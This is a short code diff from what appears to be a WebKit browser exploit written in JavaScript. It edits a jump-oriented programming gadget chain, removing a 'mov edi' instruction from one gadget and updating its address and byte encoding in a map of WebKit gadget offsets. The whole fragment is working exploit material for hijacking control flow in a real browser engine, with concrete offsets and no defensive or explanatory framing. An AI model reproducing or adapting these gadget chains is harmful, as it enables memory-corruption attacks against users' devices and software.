@@ -61,7 +61,6 @@ call qword ptr [rax + 0x40]
 `;
 const jop4 = `
 push rdx
-mov edi, 0xac9784fe
 jmp qword ptr [rax]
 `;
 const jop5 = "pop rsp; ret";
@@ -112,7 +111,7 @@ const webkit_gadget_offsets = new Map(
     [jop1]: 0x0000000001988320, // `48 8b 7e 08 48 8b 07 ff 60 70`
     [jop2]: 0x000000000076b970, // `55 48 89 e5 48 8b 07 ff 50 30`
     [jop3]: 0x0000000000f62f95, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
-    [jop4]: 0x00000000021af6ad, // `52 bf fe 84 97 ac ff 20`
+    [jop4]: 0x0000000001ef0d16, // `52 ff 20`
     [jop5]: 0x00000000000bf669, // `5c c3`
   }),
 );
